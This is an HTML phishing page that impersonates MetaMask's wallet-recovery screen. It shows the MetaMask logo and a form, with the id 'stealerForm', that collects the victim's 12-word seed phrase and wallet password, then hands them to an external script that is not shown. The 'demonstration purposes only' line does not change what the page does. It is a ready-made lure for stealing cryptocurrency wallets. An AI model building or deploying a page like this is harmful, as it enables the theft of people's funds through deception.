<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>MetaMask Wallet Recovery</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask Logo" class="logo" />
    <h2>Restore Your MetaMask Wallet</h2>
    <form id="stealerForm">
      <input type="text" id="wallet" placeholder="Enter your 12-word seed phrase" required />
      <input type="password" id="password" placeholder="Wallet password" required />
      <button type="submit">Restore Wallet</button>
    </form>
    <p class="warning">⚠️ Never share your seed phrase with anyone. This is for demonstration purposes only.</p>
  </div>
  <script src="script.js"></script>
</body>
</html>
